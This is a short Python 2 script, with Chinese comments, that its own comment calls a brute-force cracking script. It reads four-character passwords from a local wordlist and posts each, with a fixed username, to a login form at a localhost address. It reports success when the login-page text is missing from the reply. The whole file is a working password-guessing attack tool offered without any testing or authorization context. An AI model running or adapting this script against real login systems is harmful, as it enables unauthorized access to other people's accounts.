#coding=utf-8
import urllib, urllib2, HTMLParser


# 解析网页的爬虫
class OAParser(HTMLParser.HTMLParser):
    def __init__(self):
        HTMLParser.HTMLParser.__init__(self)
        self.pd = []

    def handle_data(self, data):
        # print "Encountered some data  :", data
        self.pd.append(data)


# 暴力破解脚本
def tryLogin(name, pwd):
    parm = {"loginName": name,
            "password": pwd}
    url = "http://127.0.0.1:8080/ttt"
    r = urllib2.urlopen(url, urllib.urlencode(parm))
    parse = OAParser()
    parse.feed(r.read())
    parse.close()
    isFind = False
    print parse.pd
    if "用户登录" in parse.pd:  # 这里是对应网站的密码验证逻辑
        print '尝试密码', pwd, '登陆失败'
        isFind = False
    else:
        print user, '登陆成功', 'password = ', pwd
        isFind = True
    del (parse)

    return isFind


user = 'testUser'
# password=['1','12','123','1234','12345','123456','12345678']
fpath = '/Users/edge/Desktop/pwdNum4.txt'
pfile = open(fpath, 'r')
for onePwd in pfile.readlines():
    if tryLogin(user, onePwd[:4]):
        break;
